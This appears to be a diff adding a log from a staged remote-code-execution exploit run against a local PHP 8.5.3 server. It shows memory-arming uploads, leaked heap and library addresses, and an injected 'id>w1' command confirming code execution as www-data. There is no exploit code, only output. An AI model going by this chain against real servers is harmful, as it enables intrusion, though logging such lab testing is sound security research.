@@ -1,0 +1,16 @@
+[15:22:26] target=http://127.0.0.1:18123/index.php stage=3 cmd='id>w1' log=live_run_20261026_152226.log
+[15:22:26] [preflight] GET / -> HTTP/1.1 200 OK (3 bytes)
+[15:22:26] [*] target PHP version = 8.5.3 (profile selected)
+[15:22:26] [preflight] GET /p -> HTTP/1.1 404 Not Found (pre-existing body=314 bytes)
+[15:22:26] [stage1] try 1: arming (chunked ~140MB upload)...
+[15:22:28] [stage1] arm done in 2.2s: HTTP/1.1 200 OK
+[15:22:30] [stage1] LEAK chunk base = 0x7ffffe000000 (cluster n=98)
+[15:22:30] [stage2] try 1: arming (chunked ~140MB upload)...
+[15:22:32] [stage2] arm done in 2.2s: HTTP/1.1 200 OK
+[15:22:34] [stage2] LEAK libphp base = 0x7ffffaa00000 (ptr=0x7ffffb185620, dtor gate OK)
+[15:22:34] [*] HT=0x7ffffe07e0d8 zif_abs=0x7ffffaf6d1e0 carrier=standard
+[15:22:34] [stage3] cycle 1: arming pads=114 (chunked ~140MB upload)...
+[15:22:36] [stage3] arm done in 2.1s: HTTP/1.1 200 OK
+[15:22:36] [stage3] exploit sent in 0.0s: '<no response>'
+[15:22:39] [stage3] RCE CONFIRMED cycle 1: GET /w1 -> HTTP/1.1 200 OK body=b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
+[15:22:39] === FULL RCE CONFIRMED ===
